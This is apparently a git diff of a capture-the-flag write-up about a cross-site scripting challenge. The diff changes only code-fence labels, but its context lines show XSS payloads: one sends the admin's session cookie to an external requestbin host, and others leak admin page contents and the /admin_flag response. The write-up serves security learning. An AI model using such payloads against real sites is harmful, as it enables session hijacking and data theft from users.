@@ -16,7 +16,7 @@ Trying `<script>alert(1)</script>` confirms that.
 
 Like with most XSS challenges, I assumed we need to steal the admin's session cookie allowing us to login as them. So I wrote a small cookie stealing script and have the admin's cookie sent over to a requestbin. 
 
-```js
+```html
 <script>
   req = new XMLHttpRequest(); 
   req.open('GET', 'https://en80on4rjnaxk.x.pipedream.net/?cookie=' + document.cookie); 
@@ -39,7 +39,7 @@ So instead of stealing `document.cookie` let's steal `document.getElementsByClas
 
 However, there is one additional step due to the fact that the admin console is loaded after our XSS executes so we need to add an event listener to run the XSS after everything has been rendered
 
-```js
+```html
 <script>
 document.addEventListener("DOMContentLoaded", function(event){
   req = new XMLHttpRequest(); 
@@ -59,7 +59,7 @@ From that we get:
 
 Instead of simulating the press of the flag button, I opted to simply leak the entire source code and see what pressing the button does.
 
-```js
+```html
 <script>
 document.addEventListener("DOMContentLoaded", function(event){
   req = new XMLHttpRequest();
@@ -73,7 +73,7 @@ We can see the button simply makes a get request to `/admin_flag` endpoint.
 
 I thought I was really close to solving it at this point, simply needed to make the admin visit that endpoint and sent its contents to the requestbin. 
 
-```js
+```html
 <script>
 req1 = new XMLHttpRequest();
 req1.open('GET', '/admin_flag');
